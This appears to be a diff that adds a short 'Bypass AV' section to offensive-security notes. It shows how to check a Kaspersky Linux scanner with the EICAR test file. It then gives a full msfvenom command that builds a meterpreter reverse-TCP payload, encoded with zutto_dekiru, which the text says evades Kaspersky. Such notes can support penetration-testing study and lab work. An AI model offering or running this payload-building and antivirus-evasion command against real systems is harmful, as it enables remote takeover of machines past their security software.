@@ -64,5 +64,13 @@ below example will check if user os running as root
 :endif
 ```
 
+## Bypass AV 
 
+First, let's test our linux scan with [eicar](https://www.eicar.org/?page_id=3950) project. ```sudo kesl-control --scan-file ./eicar.txt```. The the eicar.txt should be removed. Otherwise, the scanner is not working. We can also check the Kaspersky’s event log for detected events ```sudo kesl-control -E --query | grep DetectName```.
 
+#### Bypass with x64/zutto_dekiru encoder
+this method bypass Kaspersky scanner, but not all scanner at [Antiscan.me](https://antiscan.me/)
+
+```
+sudo msfvenom -p linux/x64/meterpreter/reverse_tcp LPORT=443 LHOST=10.10.10.6 -e x64/zutto_dekiru -f elf -o /tmp/met64zutto.elf
+```
